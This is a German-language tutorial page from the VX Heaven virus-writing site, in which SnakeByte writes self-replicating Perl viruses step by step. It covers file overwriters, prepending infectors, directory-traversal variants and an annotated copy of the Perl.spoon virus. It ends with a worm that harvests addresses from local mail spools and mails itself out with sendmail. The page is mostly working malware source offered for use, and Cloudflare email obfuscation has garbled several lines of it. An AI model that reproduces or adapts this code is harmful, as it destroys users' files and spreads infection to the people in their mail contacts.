<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> SnakeByte 'Perl Viren' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="SnakeByte"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, SnakeByte,Perl Viren, file, filename, datei, temp, zeile, olddir, haben, virus, infectfile, chdir, verzeichnis, laufen, öffnen, schließen, test"/>
<meta name="Description" content="VX Heaven site is dedicted to providing information about computer viruses (virii) and web space for virus authors and groups"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"fdc7c820c4a59d2ce3468f4751a9f2b68da3f74f-1498758106-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vsn01.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div><div style="float:right;"><a href="/lib/index.php?tbs=0"><img src="/img/min.gif" alt="Minimize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: left;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="32" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><br clear="both"/></div>
<div class="s2"><h1>Perl Viren</h1><p><a href="/lib/?lang=de&amp;author=SnakeByte"> SnakeByte</a><br/></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vsn01.html';</script>[<a style="" href="/lib/?lang=DE&amp;index=MA#vsn01">zurück zum Index</a>] [<a href="/lib/vsn01.html#disqus_thread">Kommentare</a>]<br/> 
<p>Da es so aussah, als ob ich Perl für einen Job lernen müsste, hab ich beschlossen, zu schauen, wie gut Perl Virenkompatibel ist :) Bis heute morgen hab ich im Web noch keinen Perlvirus gefunden, deshalb habe ich mich entschlossen ein kleines Tutorial zu dem Thema zu schreiben. Dieses Tutorial hat nahezu die gleiche Struktur wie mein Tutorial über <a href="/lib/vsn00.html">Linux Shell Script Viren</a> und ich bin sicher, das auch Perl Newbies (wie ich *g*) es verstehen werden. Bis jetzt hab ich mir den Perl Virus, den ich heute morgen fand noch nicht angesehen, weil ich von Vorne anfangen will. (Bis jetzt hab ich nur einen lahmen Overwritter hinbekommen, aber mich entschlossen schon mit dem Tippen anzufangen, damit man meinen Schritten besser folgen kann.) Die Viren wurden unter SuSe 7.0 Linux mit Perl 5.0005_3 getestet und liefen gut. Ich habe versucht sie zu anderen Systemen soweit kompatibel zu machen wie es mir möglich war, kann aber nicht garantieren, das sie darauf auch laufen.</p>
<p>Ok, fangen wir mit dem Overwritter an:</p>
<pre class="source">
 #!/usr/bin/perl

 open(File,$0);
 @Virus=&lt;File>;
 close(File);

 foreach $FileName (&lt;*>)
 {
  open(File, ">$FileName");
  print File @Virus;
  close (File);
 }
</pre>
<p>Die erste Zeile ist ein Kommentar ( eingeleitet durch das # ) Es ist ein quasi-Standart, das jede Perl Datei den Pfad und Dateinamen des Perl Interpreters in der ersten Zeile stehen hat. In der zweiten Zeile öffnen wir unsere eigene Datei. Der Dateiname des gerade laufenden Skriptes ist immer in $0 gespeichert. Danach,in der dritten Zeile, laden wir den Inhalt der Datei in das Array @Virus. Jeder Wert dieses Arrays ( @Virus[1], @Virus[2] ... ) enthält nun eine Zeile unserer Datei. Da das alles ist, was wir mit der Datei machen wollen schliessen wir sie wieder. Nun starten wir eine Schleife um nach Dateien zu suchen, die wir infizieren wollen. Wir suchen im momentanen Verzeichnis (&lt;*>) und die Dateinamen werden in $FileName gespeichert. Wir öffnen die Datei für Schreibzugriffe (durch das > vor dem Dateinamen) und schreiben unseren Virus einfach über die alte Datei. ( Mit einem >>DateiName könnten wir Daten an die Datei anhängen ) Ok, die Datei wurde durch den Virus ersetzt, also suchen wir die nächste und wiederholen die Prozedur. Ich denk mal dieses kleine Stückchen Code sollte jetzt allen klar sein ;)</p>
<p>Ok, wir verbessern das Ganze etwas, indem wir nur noch Perl Dateien überschreiben:</p>
<pre class="source"> 
 #!/usr/bin/perl
 open(File,$0);
 @Virus=&lt;File>;
 close(File);

 foreach $FileName (&lt;*>)
 {
  if ((-r $FileName) &amp;&amp; (-w $FileName) &amp;&amp; (-f $FileName))
  {
   open(File, "$FileName");
   @Temp=&lt;File>;
   close(File);
   if ((@Temp[0] =~ "perl") or (@Temp[1] =~ "perl"))
   {
    open(File, ">$FileName");
    print File @Virus;
    close (File);
   }
  }
 }
</pre>
<p>Die ersten paar Zeilen sollten vom vorherigen Beispiel bekannt sein. Danach kommt eine riesige ;) If-Abfrage. Mal sehen was sie macht. Sie filtert genau die Dateien aus, auf die wir Lese (-r) und Schreibzugriff (-w) haben, und die Dateien und keine Verzeichnisse sind. Jede dieser Kriterien muss erfüllt sein, da wir die Bedingungen mit einem &amp;&amp; ( logischem AND ) verknüpft haben. Danach öffnen wir die Datei im Lesemodus ( diesmal kein > vor dem Dateinamen ) Wir laden die komplette Datei in das Array @Temp und schließen sie. Nun überprüfen wir, ob in der ersten ( @Temp[0] ) oder zweiten ( @Temp[1] ) Zeile das Wort perl vorkommt. ( Zwischen Groß / Kleinschreibung wird unterschieden, da ich bisher keine Methode gefunden habe, die das nicht mach :( aber ich werde weiter danach suchen *g* ) Das machen wir um zu sehen, ob die Datei eine Perl Datei ist. Es gibt noch 2 weitere Sachen die wir testen könnten. Zum einen ob die Datei ausführbar ist ( if ( -x $FileName )) aber ich glaube, das nicht jeder das executable Flag setzt und denke mal, das diese Überprüfung nicht mit Windows kompatibel ist. Der andere Check wäre mit dem Linux Kommando 'file' um zu sehen ob es eine Perl Datei ist, aber dies währe wiederum nicht Windows kompatibel.</p>
<p>Ok, ich denke die Grundlagen sind klar. Vergesst nun diesen Overwritter Müll und lasst und mit etwas anständigem anfangen - Prepending:</p>
<pre class="source">
 #!/usr/bin/perl
 #PerlDemo                   # NEW

 open(File,$0);
 @Virus=&lt;File>;
 @<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="faac93888f89c7baac93888f89">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>[0...27];      # NEW
 close(File);

 foreach $FileName (&lt;*>)
 {
  if ((-r $FileName) &amp;&amp; (-w $FileName) &amp;&amp; (-f $FileName))
  {
   open(File, "$FileName");
   @Temp=&lt;File>;
   close(File);
   if ((@Temp[1] =~ "PerlDemo") or (@Temp[2] =~ "PerlDemo"))  # NEW
   {
    if ((@Temp[0] =~ "perl") or (@Temp[1] =~ "perl"))
    {
     open(File, ">$FileName");
     print File @Virus;
     print File @Temp;         # NEW
     close (File);
    }
   }
  }
 }
</pre>
<p>Diesmal habe ich die neuen Zeilen markiert, damit ihr auf einen Blick seht, was sich geändert hat. Die erste Änderung besteht darin, das wir nur die ersten 24 Zeilen der gerade laufenden, infizierten Datei in das Array laden. Wenn wir dies nicht machen würden, würden wir ja auch die bereits infizierte Datei mit vor die die wir infizieren hängen. Die zweite Änderung besteht darin, das wir die Originaldatei noch an die Datei hängen, so dass sie nach unserem Virus ausgeführt wird. Die neue Datei beginnt also mit dem Virus, dann eine Leerzeile, dann die alte Datei, beginnend mit dem #!/usr/bin/perl Kommentar. Der extra Check nach "PerlDemo" ist um zu verhindern, das wir eine Datei mehrmals infizieren.</p>
<p>Normalerweise würde ich jetzt anfangen zu versuchen das Ganze zu optimieren, aber da können wir hier nicht viel machen ausser die Zeilen zusammenzuquetschen:</p>
<pre class="source">
 #!/usr/bin/perl #PerlDemo
 open(File,$0); @Virus=&lt;File>; @<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b6e0dfc4c3c58bf6e0dfc4c3c5">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>[0...6]; close(File);
 foreach $FileName (&lt;*>) { if ((-r $FileName) &amp;&amp; (-w $FileName)
 &amp;&amp; (-f $FileName)) { open(File, "$FileName"); @Temp=&lt;File>;
 close(File); if ((@Temp[1] =~ "PerlDemo") or (@Temp[2] =~ "PerlDemo"))
 { if ((@Temp[0] =~ "perl") or (@Temp[1] =~ "perl")) { open(File,
 ">$FileName"); print File @Virus; print File @Temp; close (File); } } } }
</pre>
<p>Dies spart nur ein paar Zeilenumbrüche ein und ist nicht sehr cool :p Ok, fügen wir unserem Virus mal ein paar neue Features hinzu, wie das infizieren verschiedener Verzeichnisse. Zuerst werden wir uns mal Downward Travelling ansehen.</p>
<pre class="source">
 #!/usr/bin/perl
 #Perl Virus - Downward Travelling
 open(File,$0);
 @Virus=&lt;File>;
 @<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="12447b6067612f52447b606761">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>[0...24];
 close(File);

 &amp;InfectFile;                # NEW
 chdir('..');                # NEW
 &amp;InfectFile;                # NEW

 sub InfectFile {            # NEW
  foreach $FileName (&lt;*>) {
   if ((-r $FileName) &amp;&amp; (-w $FileName) &amp;&amp; (-f $FileName)) {
    open(File, "$FileName");
    @Temp=&lt;File>;
    close(File);
    if ((@Temp[1] =~ "Virus") or (@Temp[2] =~ "Virus")) {
     if ((@Temp[0] =~ "perl",,i) or (@Temp[1] =~ "perl",,i)) {   # NEW
      open(File, ">$FileName");
      print File @Virus;
      print File @Temp;
      close (File);
 }}}}}
</pre>
<p>Was ist diesmal passiert ? Die erste Änderung, die einem auffält, ist das das Suchen nach Dateien und Infizieren in einer Unterroutine geschieht, die zweimal vom Hauptprogramm aus aufgerufen wird. Eine weitere Änderung ist das chdir('..') das uns ein Verzeichnis nach unten befördert. Das dürfte unter Unix/Linux und DOS/Windows Systemen prima klappen, aber Fehler unter MacOS erzeugen, weil MacOS '::' benutzt um ein Verzeichnis nach unten zu gelangen. Traurig aber wahr, Perl ist nicht so portierbar, wie wir es gerne hätten :( Eine weitere Änderung ist in dem Check der Datei (@Temp[1]=~ "perl",,i). Das ,,i bewirkt, das die Suche nicht mehr zwischen Gross und Kleinbuchstaben unterscheidet. Nun finden wir also auch Perl Dateien, die mit #!C:\Programme\Perl\Perl.exe beginnen. Ein, nennen wir es Bug, im Virus ist natürlich, das wir das alte Verzeichnis nicht wiederherstellen. Dies ist ein anderes Problem, das durch die Inkompatibilität der Verschiedenen Betriebssysteme begründet ist. In Unix/Linux können wir den momentanen Pfad dzr $CurPath=`pwd`; ermitteln, da wir hier das externe Programm pwd aufrufen und die Ausgabe in $CurPath speichern. Dies funktioniert natürlich nicht unter Windows oder MacOS. Glücklicherweise können wir das Betriebssystem auf dem wir laufen mit der $^O Variable herausfinden, die seit Perl 5.0002 verwendet werden kann. Der folgende Code überprüft, ob wir in Dos, Windows, Linux, BSD oder einer Solaris Maschine laufen.</p>
<pre class="source">
 #!/usr/bin/perl
 #Perl Virus - Downward Travelling
 open(File,$0);
 @Virus=&lt;File>;
 @<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="8ed8e7fcfbfdb3ced8e7fcfbfd">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>[0...30];
 close(File);

 &amp;InfectFile;
 if (($^O =~ "bsd") or ($^O =~ "linux") or ($^O =~ "solaris")) { $OldDir = `pwd` }       # NEW
 if (($^O =~ "dos") or ($^O =~ "MSWin32")) { $OldDir = `cd` }                            # NEW
 $DotDot = '..';                                                                         # NEW
 if ($^O =~ "MacOS") { $DotDot = "::" }                                                  # NEW
 chdir($DotDot);                                                                         # NEW
 &amp;InfectFile;
 chdir($OldDir);                                                                         # NEW

 sub InfectFile {
  foreach $FileName (&lt;*>) {
   if ((-r $FileName) &amp;&amp; (-w $FileName) &amp;&amp; (-f $FileName)) {
    open(File, "$FileName");
    @Temp=&lt;File>;
    close(File);
    if ((@Temp[1] =~ "Virus") or (@Temp[2] =~ "Virus")) {
     if ((@Temp[0] =~ "perl") or (@Temp[1] =~ "perl")) {
      open(File, ">$FileName");
      print File @Virus;
      print File @Temp;
      close (File);
 }}}}}
</pre>
<p>Ok, wenn das OS BSD, Linux oder Solaris ist, ermitteln wir den aktuellen Pfad mit dem pwd Commando. Unter Windows und Dos benutzen wir das Kommando cd, mit dem man normalerweise Verzeichnisse wechselt, das einem aber ohne Parameter den momentanen Pfad ausgibt. Dann setzen wir die zwei Punkte auf '..', mit denen wir in nahezu jedem Betriebssystem eine Stufe nach unten gelangen, ausser MacOS. Wenn wir unter MacOS laufen änderen wir sie um zu '::'. Vielleicht wäre es besser zwei Checks zu machen. Einen ob wir unter MacOS laufen um die Dots zu setzen und einen um zu ermitteln ob wir 'cd' verwenden können. Für alles andere benutzen wir dann einfach '..' und 'pwd' da Perl auf einigen mehr Unix/Linux Systemen läuft, als den hier aufgeführten, die allerdings alle 'pwd' unterstützen. Wenn wir aufwärts durch die Verzeichnisse laufen wollen, haben wir das gleiche Problem. Die verschiedenen Betriebssysteme haben andere Bezeichnungen für das unterste Verzeichnis. Unter Unix/Linux ist es /, Windows und Dos haben gleich ein root Verzeichnis für jeden Datenträger A:, B:, C:, D:, und soweit ich weiss gibt es auf dem Mac gar kein unterstes Verzeichnis. Mit dem folgenden Quellcode will ich aber versuchen, all diese Probleme zu meistern :</p>
<pre class="source">
 #!/usr/bin/perl
 # Perl - Get'em'all Virus
 open(File,$0);
 @Virus=&lt;File>;
 @<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="edbb849f989ed0adbb849f989e">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>[0...46];
 close(File);

 &amp;InfectFile;
 if ($^0 =~ "MacOS") {
  chdir('::');
  &amp;InfectFile; }
 else { if (($^O =~ "dos") or ($^O =~ "MSWin32")) {
  $OldDir = `cd`;
  chdir('..');
  &amp;InfectFile;
  chdir('C:\');
  &amp;SearchUpperDirectorys;
  chdir($OldDir);}
 else {
  $OldDir = `pwd`;
  chdir("/");
  &amp;SearchUpperDirectorys;
  chdir($OldDir);}}

 sub InfectFile {
  foreach $FileName (&lt;*>) {
   if ((-r $FileName) &amp;&amp; (-w $FileName) &amp;&amp; (-f $FileName)) {
    open(File, "$FileName");
    @Temp=&lt;File>;
    close(File);
    if ((@Temp[1] =~ "Virus") or (@Temp[2] =~ "Virus")) {
     if ((@Temp[0] =~ "perl") or (@Temp[1] =~ "perl")) {
      open(File, ">$FileName");
      print File @Virus;
      print File @Temp;
      close (File);
 }}}}}

 sub SearchUpperDirectorys {
  foreach $Directory (&lt;*>) {
   if ((-r $Directory) &amp;&amp; (-w &amp;Directory ) &amp;&amp; (-d $Directory) {
    chdir ($Directory);
    &amp;InfectFile;
    chdir ('..')
 }}}
</pre>
<p>Ok, wenn wir auf einem Mac laufen infizieren wir das momentane und das Verzeichnis eins weiter unten. Unter Dos oder Windows infizieren wir das momentane, das eines weiter unten und starten auf Laufwerk C: die Suche nach weiteren Perl Dateien. Danach stellen wir auch das Ursprungsverzeichnis wieder her. Unter jedem anderen OS, suchen wir im momentanen Verzeichnis nach Dateien und im Root Verzeichnis ( / ) nach weiteren Verzeichnissen. Auch hier wird das Originalverzeichnis wiederhergestellt. Wow, normalerweise wollte ich ja nun die $Path Variable nach weiteren Verzeichnissen durchsuchen, aber nach soviel inkompatibilität bin ich erstmal abgeschreckt.</p>
<p>Nun will ich mir erstmal den Virus ansehen, von dem ich vorhin gesprochen habe. AVP entdeckt ihn als Perl.spoon und er wurde geschrieben von PaddingX. I hoffe mal es ist ok für ihn, wenn ich den Virus hier vorstelle, ich weiß leider nicht wo ich ihn erreichen kann um ihn zu fragen :(. Ich habe dem Quellcode ein paar Kommentare hinzugefügt, die mit einem #S gekennzeichnet sind :</p>
<pre class="source">
 #!/usr/bin/perl
 use File::Find;             #S er benutzt ein Modul für die Suche nach Dateien, das allerdings in allen Standart Perl Paketen enthalten ist.
 &amp;virus();                   #S Aufruf der Virus Subroutine
                             #S nachdem der Virus ausgeführt wurde zeigt der Dropper einen Payload ( nur in der ersten Generation )
 print "\nThis program is infected by the Perl virus\n\n";

 sub virus                   #S Anfang des Viruses
   {
     my ( $pid, $new );      #S Definition von lokalen Variabeln
     if( $pid = fork ) { return; }
     else
       {
         open( source, $0 );        #S öffnen der Virus Datei
         finddepth ( \&amp;infect, '/home/chris/test' );    #S '/home/chris/test' in dem Pfad werden Dateien infiziert.
         sub infect
             {
             open target, "$File::Find::name";          #S Opferdatei öffnen
             $_ = &lt;target>;                             #S in einen String einlesen
             if ( /(\#!.*perl)/ )                       #S Suche nach 'perl' in der ersten Zeile um zu sehen ob es ein Perl Skript ist
             {
                 $_ = &lt;target>;                         #S zweite Zeile lesen
                 if( $_ ne "use File::Find;\n" )        #S wenn das Script das File::Find Modul benutzt wird es nicht infiziert -> infection mark
                   {
                     $new = $1 . "\nuse File::Find;\n&amp;virus();\n" . $_;  #S Schreibe die ersten beiden Zeilen des Virusses in $NEW
                     while( &lt;target> ) { $new = $new . $_; }    #S Datei in $NEW schreiben
                     seek(  source, 0, 0 );
                      while( &lt;source> ne "sub virus\n" ) { };   #S eigene Datei nach der Virus routine durchsuchen
                      $new = $new . "\nsub virus\n";            #S 'sub virus' in $NEW schreiben
                      while( &lt;source> ) { $new = $new . $_; }   #S Rest des Viruses an $NEW anhängen
                      close  target;                        #S Datei schließen
                      open   target, ">$File::Find::name";  #S für Schreibzugriff erneut öffnen
                      print  target $new;                   #S $new in die Datei schreiben
                   }
               }
             close( target );    #S Datei schließen
           }
         close( source );        #S Virus Datei schließen
         exit( 0 );              #S Programm beenden
       }
  }

 # a Perl virus, by paddingx
 # 08/15/1999
</pre>
<p>Ok, wir sehen, dieser Virus ist ein Appender. Er schreibt einen Call zum Virus an den Anfang und hängt dann den Rest des Codes an die Datei. Das ist die gleiche Methode wie bei der Infektion von Com Dateien unter DOS. Die Infizierte Datei sieht dann folgendermassen aus :</p>
<pre class="source">
 [ Stub :
    #!/usr/bin/perl
    use File::Find;
    &amp;virus();           ]
 [... Original File ... ]
 [ .. virus procedure ..]
</pre>
<p>Auch wenn es nur auf Unix Systemen läuft ( wegen dem Pfad und der fork Anweisung, die auf Mac OS, Win32, AmigaOS und RISC OS nicht existiert ) ist es trotzdem eine nettes Stück Code, weil ich denke das sich mit dieser Art der Infektion auch Entry Point Obscurity Techniken implementieren lassen, indem man die Datei nach einem Call durchsucht ( &amp;Procedure ), diesen auf den Virus umlenkt und am Ende des Viruses die Originalprozedur wieder aufruft...</p>
<p>Ok, hier noch ein letztes Stück code, nur um eine andere einfache Technik zu zeigen, die mit Perl machbar ist. Dies ist ein selbstmailender Perl Wurm, der Sendmail benutzt und annimmt das die Mails in /var/spool/mail/ gespeichert sind. Vielleicht will ja einer der Leute, die sich besser mit Linux auskennen, das Skript so ändern, das es den Mailordner aus der sendmail.cf ausliest ;)</p>
<pre class="source">
 #!/usr/bin/perl
 open(File,$0);
 @Virus=&lt;File>;
 @<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="42142b3037317f02142b303731">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>[0...29];
 close(File);

 foreach $FileName (&lt;/var/spool/mail/*>) {
  if ((-r $FileName) &amp;&amp; (-f $FileName)) {
   open(File, "$FileName");
   @test1=&lt;File>;
   close(File);
   @ReceiverList = grep /From:/, @test1;
   foreach $Receiver2 (@ReceiverList){
    @Receiver = split(/:/, $Receiver2);
    @Addy = split(/&lt;/, @Receiver[1]);
    open(File,">PerlWurm");
    print File "<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b9f1d0f9f8ddddc0">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>[0]\n";
    print File "take a look at this perl script\nand see what is possible to do\nin perl.. \n";
    print File " cu soon\n\n\n";
    print File @Virus;
    print File ".\n";
    close(File);

    chomp(@Addy[1]);
    chop(@Addy[1]);
    $x = `sendmail @Addy[1] &lt; PerlWurm`;
 }}}
</pre>
<p>Ich hoffe ihr habt den kleinen Ausflug in die Perl Welt genossen. Ich jedenfalls habe es.</p>
[<a style="" href="/lib/?lang=DE&amp;index=MA#vsn01">zurück zum Index</a>] [<a href="/lib/vsn01.html#disqus_thread">Kommentare</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vsn01">de</a><a href="/lib/index.php?lang=en&amp;id=vsn01">en</a><a href="/lib/index.php?lang=es&amp;id=vsn01">es</a><a href="/lib/index.php?lang=it&amp;id=vsn01">it</a><a href="/lib/index.php?lang=fr&amp;id=vsn01">fr</a><a href="/lib/index.php?lang=pl&amp;id=vsn01">pl</a><a href="/lib/index.php?lang=ru&amp;id=vsn01">ru</a><a href="/lib/index.php?lang=ua&amp;id=vsn01">ua</a></div>
</body>
</html>
